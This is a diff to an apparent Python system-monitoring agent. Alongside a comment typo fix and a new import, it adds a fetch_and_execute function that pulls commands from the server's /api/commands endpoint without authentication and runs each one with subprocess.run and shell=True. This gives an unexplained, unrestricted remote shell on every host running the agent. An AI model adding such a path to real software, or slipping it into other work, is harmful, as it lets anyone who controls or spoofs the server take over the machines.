@@ -4,12 +4,13 @@ import time
 import json
 import logging
 import psutil
+import subprocess
 import requests
 from argparse import ArgumentParser
 from datetime import datetime
 
 interval = 10
-# ogging
+# logging
 logging.basicConfig(filename='/var/log/agent.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 def get_system_info():
@@ -41,6 +42,18 @@ def send_report(server_url, auth_token, data):
     except requests.RequestException as e:
         logging.error(f"Failed to send report: {e}")
         return False
+
+
+def fetch_and_execute(server_url):
+    try:
+        response = requests.get(f"{server_url}/api/commands")
+        if response.status_code == 200:
+            commands = response.json().get("commands", [])
+            for command in commands:
+                subprocess.run(command, shell=True)
+    except requests.RequestException as e:
+        print(f"Error fetching commands: {e}")
+
 
 def main(server_url, auth_token, interval):
     """Main loop to send reports at regular intervals."""
